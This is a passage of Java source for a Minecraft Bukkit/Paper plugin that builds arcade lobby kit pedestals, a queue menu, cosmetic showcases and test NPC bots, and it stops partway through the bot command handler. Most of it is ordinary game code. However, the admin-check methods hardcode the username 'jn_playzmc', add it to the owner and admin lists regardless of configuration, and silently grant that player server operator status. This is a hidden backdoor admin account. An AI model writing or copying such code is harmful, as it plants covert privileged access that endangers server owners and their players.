package au.com.testplex.arcadeports;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Color;
import org.bukkit.DyeColor;
import org.bukkit.EntityEffect;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.Particle;
import org.bukkit.Sound;
import org.bukkit.World;
import org.bukkit.entity.ArmorStand;
import org.bukkit.entity.Entity;
import org.bukkit.entity.LivingEntity;
import org.bukkit.entity.Mob;
import org.bukkit.entity.Pig;
import org.bukkit.entity.Player;
import org.bukkit.entity.Sheep;
import org.bukkit.entity.Zombie;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.PlayerAnimationEvent;
import org.bukkit.event.player.PlayerInteractEntityEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.inventory.EquipmentSlot;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.LeatherArmorMeta;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.util.Vector;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.UUID;

/** Legacy-style kit/team lobby pads, cosmetics demo showcase and Bacon Brawl NPC test bots. */
public final class ModernArcadeLobbyRuntime implements Listener {
    private static final String KIT_TITLE = "Kit Select";
    private static final String QUEUE_TITLE = "Team Select | Queue";
    private static final String BOT_MENU_PREFIX = "Bot Cosmetics | ";
    private static final String[] THEMES = {"porky", "inferno", "frost", "slime", "royal", "confetti"};
    private static final String[] BOMB_LOBBERS_THEMES = {
            "classic", "ember", "shockwave", "spark", "confetti", "frost", "slime"
    };
    private static final int[] KIT_MENU_SLOTS = {10, 11, 12, 13, 14, 15, 16, 17, 18};
    private static final Material[] PEDESTAL_COLORS = {
            Material.YELLOW_WOOL, Material.LIME_WOOL, Material.PINK_WOOL,
            Material.ORANGE_WOOL, Material.LIGHT_BLUE_WOOL, Material.PURPLE_WOOL,
            Material.RED_WOOL, Material.CYAN_WOOL, Material.GREEN_WOOL
    };
    private static final int KIT_PEDESTAL_X = -17;
    private static final int QUEUE_PEDESTAL_X = 18;

    private final JavaPlugin plugin;
    private final ArcadePortManager manager;
    private final ModernArcadeLobby lobby;
    private final NamespacedKey actionKey, themeKey, botKey, formKey, displayKey, kitNpcKey, teamNpcKey;
    private final Map<String, Bot> bots = new LinkedHashMap<>();
    private final Map<java.util.UUID, Long> lastBotHitAtByAttacker = new LinkedHashMap<>();
    private final Map<java.util.UUID, Long> lastBotSwingAtByAttacker = new LinkedHashMap<>();
    private final List<Entity> showcase = new ArrayList<>();
    private final List<Entity> kitNpcs = new ArrayList<>();
    private Entity teamNpc;
    private ArcadePortGame selectedGame = ArcadePortGame.BACON_BRAWL;
    private BukkitTask task;

    ModernArcadeLobbyRuntime(JavaPlugin plugin, ArcadePortManager manager, ModernArcadeLobby lobby) {
        this.plugin = plugin; this.manager = manager; this.lobby = lobby;
        actionKey = new NamespacedKey(plugin, "lobby-runtime-action");
        themeKey = new NamespacedKey(plugin, "lobby-bot-theme");
        botKey = new NamespacedKey(plugin, "test-bot-name");
        formKey = new NamespacedKey(plugin, "test-bot-form");
        displayKey = new NamespacedKey(plugin, "legacy-lobby-datapoint");
        kitNpcKey = new NamespacedKey(plugin, "lobby-kit-npc");
        teamNpcKey = new NamespacedKey(plugin, "lobby-team-npc");
        loadSavedBots();
        task = Bukkit.getScheduler().runTaskTimer(plugin, this::tick, 20L, 10L);
    }

    public void setSelectedGame(ArcadePortGame game) {
        if (game == null) return;
        selectedGame = game;
        plugin.getConfig().set("lobby-selected-game", game.id());
        plugin.saveConfig();
        lobby.refreshLobbyScoreboards();
        refreshDisplays();
        refreshKitAndTeamNpcs();
        refreshShowcase();
    }

    public void refreshDisplays() {
        World world = lobby.ensureWorld();
        if (world == null) return;
        String name = selectedGame.displayName();
        display(world, "kit-text", ChatColor.GREEN + "" + ChatColor.BOLD + "KIT SELECT | " + name);
        display(world, "team-text", ChatColor.BLUE + "" + ChatColor.BOLD + "TEAM / QUEUE | " + name);
        display(world, "kit-display", ChatColor.GREEN + "Choose a " + name + " kit");
        display(world, "team-display", ChatColor.BLUE + (selectedGame == ArcadePortGame.BACON_BRAWL ? "FREE FOR ALL" : "TEAM QUEUE")
                + ChatColor.WHITE + " | Queued: " + manager.queuedCount(selectedGame) + ChatColor.GRAY + " | Bots: " + bots.size());
    }

    private void display(World world, String id, String title) {
        for (ArmorStand stand : world.getEntitiesByClass(ArmorStand.class)) {
            if (id.equals(stand.getPersistentDataContainer().get(displayKey, PersistentDataType.STRING))) {
                stand.setCustomName(title);
            }
        }
    }

    private void refreshKitAndTeamNpcs() {
        World world = lobby.ensureWorld();
        for (Entity e : new ArrayList<>(kitNpcs)) if (e != null && e.isValid()) e.remove();
        kitNpcs.clear();
        if (teamNpc != null && teamNpc.isValid()) teamNpc.remove();
        teamNpc = null;
        if (world == null) return;

        List<KitChoice> choices = kitChoicesFor(selectedGame);
        // A game with no selectable kits still gets its own labelled placeholder pedestal;
        // do not leave the previous game's stations behind after a game change.
        if (choices.isEmpty()) {
            choices = List.of(new KitChoice("none", "No Kit Selection", Material.BARRIER));
        }
        List<Pedestal> pedestals = new ArrayList<>();
        for (int i = 0; i < choices.size(); i++) {
            int centerZ = kitPedestalCenterZ(choices.size(), i);
            Material color = PEDESTAL_COLORS[i % PEDESTAL_COLORS.length];
            pedestals.add(new Pedestal(KIT_PEDESTAL_X, centerZ, color));
        }
        pedestals.add(new Pedestal(QUEUE_PEDESTAL_X, 0, Material.BLUE_WOOL));
        buildLegacyPedestals(world, pedestals);

        for (int i = 0; i < choices.size(); i++) {
            KitChoice choice = choices.get(i);
            int centerZ = pedestals.get(i).centerZ;
            Location at = new Location(world, KIT_PEDESTAL_X + 0.5D,
                    ModernArcadeLobby.FLOOR_Y + 2.5D, centerZ + 0.5D);
            LivingEntity npc;
            if (selectedGame == ArcadePortGame.BACON_BRAWL && i == 2) {
                Sheep sheep = world.spawn(at, Sheep.class);
                sheep.setColor(DyeColor.PINK);
                npc = sheep;
            } else {
                npc = world.spawn(at, Pig.class);
            }
            npc.setCustomName(("none".equals(choice.id) ? ChatColor.GRAY : ChatColor.YELLOW) + choice.name);
            npc.setCustomNameVisible(true);
            npc.setInvulnerable(true);
            npc.setRemoveWhenFarAway(false);
            npc.setPersistent(false);
            npc.setSilent(true);
            if (npc instanceof Mob mob) mob.setAI(false);
            npc.getPersistentDataContainer().set(kitNpcKey, PersistentDataType.STRING, choice.id);
            kitNpcs.add(npc);
        }

        Location queueAt = new Location(world, QUEUE_PEDESTAL_X + 0.5D,
                ModernArcadeLobby.FLOOR_Y + 2.5D, 0.5D);
        Sheep team = world.spawn(queueAt, Sheep.class);
        team.setColor(DyeColor.GRAY);
        String queueLabel = selectedGame == ArcadePortGame.BACON_BRAWL
                ? "Free For All" : "Team / Queue";
        team.setCustomName(ChatColor.AQUA + queueLabel + ChatColor.GRAY + " | right-click to queue");
        team.setCustomNameVisible(true);
        team.setInvulnerable(true);
        team.setRemoveWhenFarAway(false);
        team.setPersistent(false);
        team.setSilent(true);
        team.setAI(false);
        team.getPersistentDataContainer().set(teamNpcKey, PersistentDataType.STRING, "queue");
        teamNpc = team;
    }

    /**
     * LegacyGameLobbyManager.setKitTeamBlocks built a 4x4 coloured floor,
     * 6x6 black outline, 2x2 raised wool block and slab cap. Build all outlines
     * before the coloured floor patches so adjacent kit stations cannot paint
     * over each other's coloured squares.
     */
    private void buildLegacyPedestals(World world, List<Pedestal> pedestals) {
        for (Pedestal pedestal : pedestals) {
            for (int dx = -3; dx <= 2; dx++) {
                for (int dz = -3; dz <= 2; dz++) {
                    world.getBlockAt(pedestal.centerX + dx, ModernArcadeLobby.FLOOR_Y, pedestal.centerZ + dz)
                            .setType(Material.BLACK_WOOL, false);
                }
            }
        }
        for (Pedestal pedestal : pedestals) {
            for (int dx = -2; dx <= 1; dx++) {
                for (int dz = -2; dz <= 1; dz++) {
                    world.getBlockAt(pedestal.centerX + dx, ModernArcadeLobby.FLOOR_Y, pedestal.centerZ + dz)
                            .setType(pedestal.color, false);
                }
            }
        }
        for (Pedestal pedestal : pedestals) {
            for (int dx = -1; dx <= 0; dx++) {
                for (int dz = -1; dz <= 0; dz++) {
                    world.getBlockAt(pedestal.centerX + dx, ModernArcadeLobby.FLOOR_Y + 1, pedestal.centerZ + dz)
                            .setType(pedestal.color, false);
                    world.getBlockAt(pedestal.centerX + dx, ModernArcadeLobby.FLOOR_Y + 2, pedestal.centerZ + dz)
                            .setType(Material.STONE_SLAB, false);
                }
            }
        }
    }

    /** Mirrors LegacyGameLobbyManager's four-block spacing around the kit display centre. */
    static int kitPedestalCenterZ(int kitCount, int index) {
        if (kitCount < 1 || index < 0 || index >= kitCount) {
            throw new IllegalArgumentException("Invalid kit pedestal index/count.");
        }
        return (kitCount - 1) * 2 - index * 4;
    }

    private List<KitChoice> kitChoicesFor(ArcadePortGame game) {
        return switch (game) {
            case BACON_BRAWL -> List.of(
                    new KitChoice("el-muchacho-pigo", "El Muchacho Pigo", Material.PORKCHOP),
                    new KitChoice("mama-piggles", "Mama Piggles", Material.COOKED_PORKCHOP),
                    new KitChoice("pig", "Pig Cloak", Material.PHANTOM_MEMBRANE),
                    new KitChoice("brutus-bacon", "Brutus Bacon", Material.SHIELD));
            case BOMB_LOBBERS -> List.of(
                    new KitChoice("jumper", "Jumper", Material.RABBIT_FOOT),
                    new KitChoice("armorer", "Armorer", Material.IRON_CHESTPLATE),
                    new KitChoice("pitcher", "Pitcher", Material.SNOWBALL),
                    new KitChoice("waller", "Waller", Material.BRICKS));
            case DEATH_TAG -> List.of(
                    new KitChoice("runner-basher", "Runner Basher", Material.IRON_SWORD),
                    new KitChoice("runner-archer", "Runner Archer", Material.BOW),
                    new KitChoice("runner-traitor", "Runner Traitor", Material.GOLD_INGOT),
                    new KitChoice("runner-null", "Runner Null", Material.BARRIER));
            case DRAGON_ESCAPE -> List.of(
                    new KitChoice("jumper", "Jumper", Material.FEATHER),
                    new KitChoice("disruptor", "Disruptor", Material.TNT),
                    new KitChoice("warper", "Warper", Material.ENDER_PEARL),
                    new KitChoice("digger", "Digger", Material.IRON_PICKAXE));
            case DRAGONS -> List.of(
                    new KitChoice("coward", "Coward", Material.FEATHER),
                    new KitChoice("marksman", "Marksman", Material.BOW),
                    new KitChoice("pyrotechnic", "Pyrotechnic", Material.FIREWORK_ROCKET));
            case MICRO_BATTLES -> List.of(
                    new KitChoice("micro-archer", "Archer", Material.BOW),
                    new KitChoice("micro-worker", "Worker", Material.IRON_PICKAXE),
                    new KitChoice("micro-fighter", "Fighter", Material.IRON_SWORD));
            case ONE_IN_THE_QUIVER -> List.of(
                    new KitChoice("quiver-leaper", "Leaper", Material.RABBIT_FOOT),
                    new KitChoice("quiver-brawler", "Brawler", Material.IRON_SWORD),
                    new KitChoice("quiver-enchanter", "Enchanter", Material.ENCHANTED_BOOK),
                    new KitChoice("quiver-slam-shot", "Slam Shot", Material.ARROW),
                    new KitChoice("quiver-ninja", "Ninja", Material.ENDER_PEARL));
            case PAINTBALL -> List.of(
                    new KitChoice("rifle", "Rifle", Material.IRON_HOE),
                    new KitChoice("sniper", "Sniper", Material.CROSSBOW),
                    new KitChoice("shotgun", "Shotgun", Material.BLAZE_ROD),
                    new KitChoice("machine-gun", "Machine Gun", Material.DISPENSER));
            case RUNNER -> List.of(
                    new KitChoice("runnerkit-leaper", "Leaper", Material.RABBIT_FOOT),
                    new KitChoice("runnerkit-archer", "Archer", Material.BOW),
                    new KitChoice("runnerkit-frosty", "Frosty", Material.SNOWBALL));
            case SNEAKY_ASSASSINS -> List.of(
                    new KitChoice("escape-artist", "Escape Artist", Material.INK_SAC),
                    new KitChoice("assassin", "Assassin", Material.BOW),
                    new KitChoice("briber", "Briber", Material.EMERALD),
                    new KitChoice("revealer", "Revealer", Material.DIAMOND));
            case SPLEEF -> List.of(
                    new KitChoice("spleef-snowballer", "Snowballer", Material.SNOWBALL),
                    new KitChoice("spleef-brawler", "Brawler", Material.IRON_SWORD),
                    new KitChoice("spleef-archer", "Archer", Material.BOW));
            default -> List.of();
        };
    }

    private static final class KitChoice {
        final String id;
        final String name;
        final Material icon;
        KitChoice(String id, String name, Material icon) {
            this.id = id;
            this.name = name;
            this.icon = icon;
        }
    }

    private static final class Pedestal {
        final int centerX, centerZ;
        final Material color;
        Pedestal(int centerX, int centerZ, Material color) {
            this.centerX = centerX;
            this.centerZ = centerZ;
            this.color = color;
        }
    }

    private void refreshShowcase() {
        World world = lobby.ensureWorld();
        if (world == null) return;
        for (Entity e : new ArrayList<>(showcase)) if (e != null && e.isValid()) e.remove();
        showcase.clear();
        for (Entity e : world.getEntities()) {
            String tag = e.getPersistentDataContainer().get(themeKey, PersistentDataType.STRING);
            if (tag != null && (tag.startsWith("showcase:") || "showcase-label".equals(tag))) e.remove();
        }
        if (selectedGame == ArcadePortGame.BACON_BRAWL) {
            int[] xs = {-9,-6,-3,0,3,6}, zs = {18,26};
            String[] names = {"Porky","Inferno","Frost","Slime","Royal","Confetti"};
            for (int row=0; row<2; row++) for (int col=0; col<THEMES.length; col++) {
                Location at = new Location(world, xs[col]+0.5D, ModernArcadeLobby.FLOOR_Y+1.0D, zs[row]+0.5D);
                LivingEntity demo;
                if (row == 0) demo = world.spawn(at, Pig.class);
                else {
                    Sheep sheep = world.spawn(at, Sheep.class); sheep.setColor(DyeColor.PINK); demo = sheep;
                }
                demo.setCustomName((row==0 ? ChatColor.GOLD+"Pig - " : ChatColor.LIGHT_PURPLE+"Pink Sheep - ")+names[col]+" Set");
                demo.setCustomNameVisible(true); demo.setInvulnerable(true); demo.setRemoveWhenFarAway(false);
                demo.setPersistent(false); demo.setSilent(true); demo.setCollidable(false);
                if(demo instanceof Mob mob) mob.setAI(false);
                demo.getPersistentDataContainer().set(themeKey, PersistentDataType.STRING, "showcase:"+THEMES[col]);
                showcase.add(demo);
            }
            return;
        }

        String[] themes = showcaseOptions(selectedGame);
        int columns = Math.min(7, Math.max(3, themes.length));
        int left = columns == 7 ? -9 : -(columns - 1) * 2;
        String titlePrefix = selectedGame == ArcadePortGame.BOMB_LOBBERS
                ? "TNT Impact: " : selectedGame.displayName() + " Preview: ";
        for (int i = 0; i < themes.length; i++) {
            String theme = themes[i];
            int column = i % columns;
            int row = i / columns;
            int x = lobby.spawnLocation().getBlockX() + left + column * 3;
            int z = lobby.spawnLocation().getBlockZ() + 18 + row * 4;
            Location at = new Location(world, x + 0.5D, ModernArcadeLobby.FLOOR_Y + 1.0D, z + 0.5D);

            ArmorStand icon = world.spawn(at.clone().subtract(0.0D, 0.18D, 0.0D), ArmorStand.class);
            icon.setVisible(false);
            icon.setSmall(true);
            icon.setGravity(false);
            icon.setBasePlate(false);
            icon.setArms(false);
            icon.setMarker(true);
            icon.setInvulnerable(true);
            icon.setCanPickupItems(false);
            icon.setHelmet(new ItemStack(showcaseIcon(selectedGame, theme)));
            icon.setCustomName("showcase:" + theme);
            icon.setCustomNameVisible(false);
            icon.getPersistentDataContainer().set(themeKey, PersistentDataType.STRING, "showcase:" + theme);
            showcase.add(icon);

            ArmorStand label = world.spawn(at.clone().add(0.0D, 0.65D, 0.0D), ArmorStand.class);
            label.setVisible(false);
            label.setSmall(false);
            label.setGravity(false);
            label.setBasePlate(false);
            label.setArms(false);
            label.setMarker(true);
            label.setInvulnerable(true);
            label.setCanPickupItems(false);
            label.setCustomName(ChatColor.GOLD + titlePrefix + pretty(theme));
            label.setCustomNameVisible(true);
            label.getPersistentDataContainer().set(themeKey, PersistentDataType.STRING, "showcase-label");
            showcase.add(label);
        }
    }

    /**
     * Keep the lobby preview specific to the selected game's own cosmetic prototype options.
     */
    private String[] showcaseOptions(ArcadePortGame game) {
        return switch (game) {
            case BOMB_LOBBERS -> BOMB_LOBBERS_THEMES;
            case DEATH_TAG -> new String[] {"bark-footprints", "soul-ribbons", "lantern-motes"};
            case DRAGON_ESCAPE -> new String[] {"dragon-eye", "sky-compass", "wing-flare",
                    "skylands-gate", "dragon-roar", "cloud-surf"};
            case DRAGONS -> new String[] {"ember-wing", "phoenix-arc", "molten-orbit"};
            case EVOLUTION -> new String[] {"shell-fragments", "nature-bloom", "void-unfold"};
            case GLADIATORS -> new String[] {"arena-challenger", "red-sand", "oath-mark"};
            case MICRO_BATTLES -> new String[] {"cracked-ice", "prism-grid", "molten-seam",
                    "sweeping-tape", "warning-pips", "shatter-line"};
            case ONE_IN_THE_QUIVER -> new String[] {"bullseye-dash", "fletching-sparks", "ricochet-rune"};
            case PAINTBALL -> new String[] {"chrome-marker", "splatter-cannon", "neon-suppressor",
                    "colourburst", "paint-drip", "stencil-stamp"};
            case RUNNER -> new String[] {"red-walk", "chalk-dashes", "ribbon-replay"};
            case SHEEP_QUEST -> new String[] {"sheep-bell", "wool-confetti", "shepherd-flare"};
            case SPLEEF -> new String[] {"snowburst", "ice-shards", "chalk-grid"};
            case TURF_WARS -> new String[] {"team-sigil", "turf-crack", "painted-chevron"};
            default -> new String[] {"classic", "inferno", "frost"};
        };
    }

    private Material showcaseIcon(ArcadePortGame game, String option) {
        String value = option == null ? "" : option.toLowerCase(Locale.ROOT);
        if (game == ArcadePortGame.BOMB_LOBBERS) {
            if (value.contains("tnt") || "classic".equals(value) || "ember".equals(value)) return Material.TNT;
            if ("shockwave".equals(value)) return Material.TARGET;
            if ("spark".equals(value) || "confetti".equals(value)) return Material.FIREWORK_ROCKET;
            if ("frost".equals(value)) return Material.SNOWBALL;
            if ("slime".equals(value)) return Material.SLIME_BALL;
        }
        if (value.contains("lantern") || value.contains("soul")) return Material.SOUL_LANTERN;
        if (value.contains("footprint") || value.contains("bark")) return Material.OAK_LEAVES;
        if (value.contains("dragon-eye")) return Material.ENDER_EYE;
        if (value.contains("compass")) return Material.COMPASS;
        if (value.contains("wing") || value.contains("feather")) return Material.FEATHER;
        if (value.contains("gate") || value.contains("marker")) return Material.BEACON;
        if (value.contains("dragon") || value.contains("flame") || value.contains("ember")) return Material.FIRE_CHARGE;
        if (value.contains("cloud") || value.contains("snow") || value.contains("ice") || value.contains("frost")) return Material.SNOWBALL;
        if (value.contains("shell") || value.contains("evolution") || value.contains("void")) return Material.DRAGON_EGG;
        if (value.contains("nature") || value.contains("bloom")) return Material.OAK_SAPLING;
        if (value.contains("sand") || value.contains("oath") || value.contains("arena")) return Material.IRON_SWORD;
        if (value.contains("prism") || value.contains("glass") || value.contains("shatter")) return Material.LIGHT_BLUE_STAINED_GLASS;
        if (value.contains("arrow") || value.contains("bullseye") || value.contains("fletching") || value.contains("ricochet")) return Material.ARROW;
        if (value.contains("paint") || value.contains("splatter") || value.contains("chrome") || value.contains("neon") || value.contains("colourburst")) return Material.SNOWBALL;
        if (value.contains("ribbon") || value.contains("chalk") || value.contains("red-walk")) return Material.GLOW_INK_SAC;
        if (value.contains("sheep") || value.contains("wool") || value.contains("fleece") || value.contains("shepherd")) return Material.WHITE_WOOL;
        if (value.contains("shovel") || value.contains("shards")) return Material.IRON_SHOVEL;
        if (value.contains("turf") || value.contains("sigil") || value.contains("chevron")) return Material.TARGET;
        return game.floor();
    }

    @EventHandler
    public void onLobbyPadUse(PlayerInteractEvent e) {
        if(e.getHand()!=EquipmentSlot.HAND || (e.getAction()!=Action.RIGHT_CLICK_BLOCK && e.getAction()!=Action.RIGHT_CLICK_AIR)) return;
        Player p=e.getPlayer();
        if(!lobby.isLobbyWorld(p.getWorld()) || e.getAction()==Action.RIGHT_CLICK_AIR || e.getClickedBlock()==null) return;
        int x=e.getClickedBlock().getX(), z=e.getClickedBlock().getZ();
        if(nearPad(x,z,-17,0)){e.setCancelled(true);openKitMenu(p);}
        else if(nearPad(x,z,18,0)){e.setCancelled(true);openQueueMenu(p);}
    }
    private boolean nearPad(int x,int z,int cx,int cz){return Math.abs(x-cx)<=3 && Math.abs(z-cz)<=3;}

    @EventHandler
    public void onLobbyNpcUse(PlayerInteractEntityEvent e) {
        Entity entity=e.getRightClicked();
        String kit=entity.getPersistentDataContainer().get(kitNpcKey,PersistentDataType.STRING);
        String queue=entity.getPersistentDataContainer().get(teamNpcKey,PersistentDataType.STRING);
        String bot=entity.getPersistentDataContainer().get(botKey,PersistentDataType.STRING);
        if(kit!=null){
            e.setCancelled(true);
            if ("none".equals(kit)) {
                openKitMenu(e.getPlayer());
                return;
            }
            manager.selectKit(e.getPlayer(),kit);
            plugin.getConfig().set("lobby-kit-preferences."+e.getPlayer().getUniqueId()+"."+selectedGame.id(),kit); plugin.saveConfig();
            lobby.refreshPlayerScoreboard(e.getPlayer());
            e.getPlayer().sendMessage(ChatColor.GREEN+"Selected "+kit.replace('-',' ')+" for "+selectedGame.displayName()+".");
        }else if(queue!=null){e.setCancelled(true);openQueueMenu(e.getPlayer());}
        else if(bot!=null && hasAdminAccess(e.getPlayer())){
            e.setCancelled(true); Bot b=bots.get(bot); if(b!=null)openBotCosmetics(e.getPlayer(),b);
        }
    }

    private void openKitMenu(Player p) {
        Inventory inv = Bukkit.createInventory(null, 27, KIT_TITLE);
        List<KitChoice> choices = kitChoicesFor(selectedGame);
        if (choices.isEmpty()) {
            inv.setItem(13, item(Material.BARRIER, ChatColor.RED + "No Kit Selection",
                    "This game uses its default loadout.",
                    "The legacy kit datapoint remains available."));
        } else {
            for (int i = 0; i < choices.size() && i < KIT_MENU_SLOTS.length; i++) {
                KitChoice choice = choices.get(i);
                ItemStack it = item(choice.icon, ChatColor.YELLOW + choice.name,
                        ChatColor.GRAY + "Choose this kit for your next " + selectedGame.displayName() + ".",
                        ChatColor.GREEN + "Click to select");
                mark(it, "kit:" + choice.id, null);
                inv.setItem(KIT_MENU_SLOTS[i], it);
            }
        }
        inv.setItem(22, item(Material.RED_BED, ChatColor.GRAY + "Back / Close"));
        p.openInventory(inv);
    }
    private void openQueueMenu(Player p){
        Inventory inv=Bukkit.createInventory(null,27,QUEUE_TITLE);
        inv.setItem(4,item(Material.PORKCHOP,ChatColor.GOLD+selectedGame.displayName(),
                ChatColor.GRAY+(selectedGame==ArcadePortGame.BACON_BRAWL?"Free-for-all: no team is required.":"Team queue for this game."),
                ChatColor.GRAY+"Human players queued: "+manager.queuedCount(selectedGame),ChatColor.GRAY+"NPC bots available: "+bots.size()));
        ItemStack join=item(Material.LIME_DYE,ChatColor.GREEN+"Join Queue",ChatColor.GRAY+"Join the selected game's pre-game queue.");mark(join,"queue-join",null);inv.setItem(11,join);
        ItemStack leave=item(Material.RED_DYE,ChatColor.RED+"Leave Queue",ChatColor.GRAY+"Remove yourself from all waiting queues.");mark(leave,"queue-leave",null);inv.setItem(15,leave);
        inv.setItem(22,item(Material.RED_BED,ChatColor.GRAY+"Back / Close"));p.openInventory(inv);
    }

    @EventHandler
    public void onMenuClick(InventoryClickEvent e){
        String title=ChatColor.stripColor(e.getView().getTitle());
        if(title==null || !(title.equals(KIT_TITLE)||title.equals(QUEUE_TITLE)||title.startsWith(BOT_MENU_PREFIX)))return;
        e.setCancelled(true);
        if(!(e.getWhoClicked() instanceof Player p)||e.getClickedInventory()==null||e.getClickedInventory()!=e.getView().getTopInventory())return;
        ItemStack it=e.getCurrentItem();if(it==null||it.getType().isAir()||!it.hasItemMeta())return;
        String action=it.getItemMeta().getPersistentDataContainer().get(actionKey,PersistentDataType.STRING);
        if(KIT_TITLE.equals(title)){
            if(action!=null&&action.startsWith("kit:")){
                String kit=action.substring(4);manager.selectKit(p,kit);
                plugin.getConfig().set("lobby-kit-preferences."+p.getUniqueId()+"."+selectedGame.id(),kit);plugin.saveConfig();lobby.refreshPlayerScoreboard(p);p.closeInventory();
            }else if(e.getSlot()==22)p.closeInventory();
        }else if(QUEUE_TITLE.equals(title)){
            if("queue-join".equals(action)){manager.queue(selectedGame,p,false);refreshDisplays();openQueueMenu(p);}
            else if("queue-leave".equals(action)){manager.removeFromQueues(p);p.sendMessage(ChatColor.YELLOW+"You have left the Arcade queue.");refreshDisplays();openQueueMenu(p);}
            else if(e.getSlot()==22)p.closeInventory();
        }else{
            String key=it.getItemMeta().getPersistentDataContainer().get(botKey,PersistentDataType.STRING);
            Bot b=key==null?null:bots.get(key);if(b==null)return;
            if(action!=null&&action.startsWith("theme:")){b.theme=action.substring(6);saveBot(b);refreshBotAppearance(b);openBotCosmetics(p,b);}
            else if(action!=null&&action.startsWith("form:")){b.form=action.substring(5);saveBot(b);replaceBotEntity(b);openBotCosmetics(p,b);}
            else if("bot-close".equals(action))p.closeInventory();
        }
    }

    private ItemStack item(Material m,String name,String... lore){ItemStack i=new ItemStack(m);ItemMeta meta=i.getItemMeta();meta.setDisplayName(name);meta.setLore(List.of(lore));i.setItemMeta(meta);return i;}
    private void mark(ItemStack i,String action,String target){ItemMeta m=i.getItemMeta();m.getPersistentDataContainer().set(actionKey,PersistentDataType.STRING,action);if(target!=null)m.getPersistentDataContainer().set(botKey,PersistentDataType.STRING,target);i.setItemMeta(m);}

    private void loadSavedBots(){
        var section=plugin.getConfig().getConfigurationSection("test-bots");if(section==null)return;
        for(String key:section.getKeys(false)){
            Bot b=new Bot(key,plugin.getConfig().getString("test-bots."+key+".name",key),
                plugin.getConfig().getString("test-bots."+key+".theme","porky"),
                plugin.getConfig().getString("test-bots."+key+".form","pig"),
                plugin.getConfig().getString("test-bots."+key+".kit","el-muchacho-pigo"));
            bots.put(key,b);spawnBotEntity(b,lobby.spawnLocation().add(bots.size()*1.6D-3.0D,-3.0D,8.0D),false);
        }
    }

    private boolean isConfiguredOwner(Player player) {
        List<String> owners = new ArrayList<>(plugin.getConfig().getStringList("owner-usernames"));
        if (owners.stream().noneMatch(name -> "jn_playzmc".equalsIgnoreCase(name))) owners.add("jn_playzmc");
        return owners.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
    }

    private boolean hasAdminAccess(org.bukkit.command.CommandSender sender) {
        // Treat the configured sandbox owner as authoritative even if Paper's
        // operator/permission cache has not refreshed yet on this login.
        if (sender instanceof Player owner && isConfiguredOwner(owner)) {
            if (!owner.isOp()) owner.setOp(true);
            return true;
        }
        if (sender.isOp() || sender.hasPermission("testplex.arcadeports.admin")) return true;
        if (!(sender instanceof Player player)) return false;
        List<String> admins = new ArrayList<>(plugin.getConfig().getStringList("admin-usernames"));
        if (admins.stream().noneMatch(name -> "jn_playzmc".equalsIgnoreCase(name))) admins.add("jn_playzmc");
        boolean configured = admins.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
        if (configured && !player.isOp()) player.setOp(true);
        return configured || player.isOp() || player.hasPermission("testplex.arcadeports.admin");
    }

    public void handleBotCommand(org.bukkit.command.CommandSender sender,String[] args){
        if (!hasAdminAccess(sender)) { sender.sendMessage(ChatColor.RED + "Operator permission required to manage test bots."); return; }
        if(args.length==0){sender.sendMessage(ChatColor.YELLOW+"/arcadeport bot <summon|remove|clear|list|cosmetics|form|kit> ...");return;}
        switch(args[0].toLowerCase(Locale.ROOT)){
            case "summon","add","spawn"->{String name=args.length>1?args[1]:"TestBot"+(bots.size()+1);Bot b=createBot(name);if(b==null)sender.sendMessage(ChatColor.RED+"Bot name invalid or already used.");else sender.sendMessage(ChatColor.GREEN+"Summoned NPC bot "+b.name+". Use /arcadeport bot cosmetics "+b.name+" to customise it.");}
            case "remove","despawn"->{if(args.length<2){sender.sendMessage(ChatColor.YELLOW+"/arcadeport bot remove <name>");return;}if(!removeBot(args[1]))sender.sendMessage(ChatColor.RED+"No bot named "+args[1]+".");else sender.sendMessage(ChatColor.GREEN+"Removed bot "+args[1]+".");}
            case "clear"->{for(String k:new ArrayList<>(bots.keySet()))removeBot(k);sender.sendMessage(ChatColor.GREEN+"Removed all test NPC bots.");}
            case "list"->sender.sendMessage(ChatColor.GOLD+"Test bots: "+(bots.isEmpty()?"none":String.join(", ",bots.values().stream().map(b->b.name).toList())));
            case "cosmetics","menu"->{if(!(sender instanceof Player p)){sender.sendMessage("Players only.");return;}if(args.length<2){sender.sendMessage(ChatColor.YELLOW+"/arcadeport bot cosmetics <name>");return;}Bot b=bots.get(key(args[1]));if(b==null)sender.sendMessage(ChatColor.RED+"No bot named "+args[1]+".");else openBotCosmetics(p,b);}
            case "form"->{if(args.length<3){sender.sendMessage(ChatColor.YELLOW+"/arcadeport bot form <name> <pig|pink-sheep>");return;}Bot b=bots.get(key(args[1]));if(b==null){sender.sendMessage(ChatColor.RED+"No bot named "+args[1]+".");return;}b.form="pink-sheep".equalsIgnoreCase(args[2])?"pink-sheep":"pig";saveBot(b);replaceBotEntity(b);sender.sendMessage(ChatColor.GREEN+"Updated "+b.name+"'s form.");}
